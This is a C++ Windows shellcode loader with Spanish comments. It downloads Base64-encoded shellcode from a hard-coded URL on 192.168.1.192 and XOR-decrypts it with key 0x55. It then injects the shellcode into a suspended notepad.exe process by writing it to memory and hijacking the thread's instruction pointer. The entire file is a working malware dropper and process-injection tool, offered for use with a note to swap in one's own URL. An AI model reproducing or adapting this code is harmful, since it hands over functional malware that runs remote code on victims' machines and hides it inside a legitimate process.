#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <iostream>
#include <vector>
#include <string>
#include <sstream>

#pragma comment(lib, "wininet.lib")  // Para descargar el shellcode
#pragma comment(lib, "crypt32.lib")  // Para decodificar Base64

#define SHELLCODE_URL "http://192.168.1.192/shellcode_encoded.txt"  // Cambiar por tu URL

// Función para descargar el shellcode desde una URL
std::string DownloadShellcode(const char* url) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";

    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return "";
    }

    char buffer[4096];
    DWORD bytesRead;
    std::ostringstream oss;

    while (InternetReadFile(hConnect, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        oss.write(buffer, bytesRead);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return oss.str();
}

// Función para decodificar Base64
std::vector<unsigned char> Base64Decode(const std::string& encoded) {
    DWORD decodedSize = 0;
    CryptStringToBinaryA(encoded.c_str(), encoded.length(), CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL);
    
    std::vector<unsigned char> decoded(decodedSize);
    CryptStringToBinaryA(encoded.c_str(), encoded.length(), CRYPT_STRING_BASE64, decoded.data(), &decodedSize, NULL, NULL);
    
    return decoded;
}

// Función para desencriptar el shellcode usando XOR (clave 0x55)
void decrypt_shellcode(std::vector<unsigned char>& shellcode) {
    for (size_t i = 0; i < shellcode.size(); i++) {
        shellcode[i] ^= 0x55;
    }
}

int main() {
    std::cout << "[*] Descargando shellcode..." << std::endl;
    std::string encodedShellcode = DownloadShellcode(SHELLCODE_URL);
    if (encodedShellcode.empty()) {
        std::cerr << "[!] Error al descargar el shellcode" << std::endl;
        return 1;
    }

    std::cout << "[+] Shellcode descargado. Decodificando..." << std::endl;
    std::vector<unsigned char> encryptedShellcode = Base64Decode(encodedShellcode);

    std::cout << "[+] Desencriptando shellcode..." << std::endl;
    decrypt_shellcode(encryptedShellcode);

    std::cout << "[+] Inyectando en proceso..." << std::endl;

    // Crear un proceso suspendido
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        std::cerr << "[!] Error al crear el proceso" << std::endl;
        return 1;
    }

    // Obtener contexto del proceso
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

    // Reservar memoria en el proceso suspendido
    LPVOID alloc = VirtualAllocEx(pi.hProcess, NULL, encryptedShellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, alloc, encryptedShellcode.data(), encryptedShellcode.size(), NULL);

    // Cambiar el punto de ejecución al shellcode
    #ifdef _WIN64
        ctx.Rip = (DWORD64)alloc;
    #else
        ctx.Eip = (DWORD)alloc;
    #endif
    SetThreadContext(pi.hThread, &ctx);

    // Reanudar el proceso para ejecutar el shellcode
    ResumeThread(pi.hThread);
    std::cout << "[+] Shellcode ejecutado en proceso remoto" << std::endl;

    return 0;
}
